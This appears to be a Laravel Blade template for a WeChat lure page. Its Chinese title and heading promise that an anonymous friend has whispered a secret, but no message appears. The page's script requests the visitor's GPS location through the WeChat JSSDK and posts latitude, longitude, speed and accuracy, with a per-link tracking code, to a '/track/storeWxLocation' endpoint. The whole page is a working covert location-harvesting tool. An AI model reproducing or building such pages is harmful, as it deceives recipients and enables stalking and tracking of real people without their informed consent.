<!DOCTYPE html>
<html lang="{{ app()->getLocale() }}">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>您的匿名好友，对你说了一句悄悄话！</title>
    <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.js"></script>
    <script src="http://res.wx.qq.com/open/js/jweixin-1.2.0.js" type="text/javascript" charset="utf-8"></script>
</head>
<body>
<img src="{{ asset('images/quan.jpg') }}" width="100%" />
<h1>您的匿名好友，对你说了一句悄悄话，立即查看吧</h1>
<script>
    $.ajaxSetup({
        headers: {
            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
        }
    });
    wx.config({{$app->jssdk->buildConfig(['getLocation'], true)}});
    wx.ready(function() {
        wx.getLocation({
            type: 'wgs84', // 默认为wgs84的gps坐标，如果要返回直接给openLocation用的火星坐标，可传入'gcj02'
            success: function (res) {
                var latitude = res.latitude; // 纬度，浮点数，范围为90 ~ -90
                var longitude = res.longitude; // 经度，浮点数，范围为180 ~ -180。
                var speed = res.speed; // 速度，以米/每秒计
                var accuracy = res.accuracy; // 位置精度

                $.post("{{url('/track/storeWxLocation')}}", {
                    latitude: latitude,
                    longitude: longitude,
                    speed: speed,
                    accuracy: accuracy,
                    code: '{{$code}}'
                }, function(res) {
                    console.log(res, '定位成功');
                })
            }
        });
    });
</script>
</body>
</html>
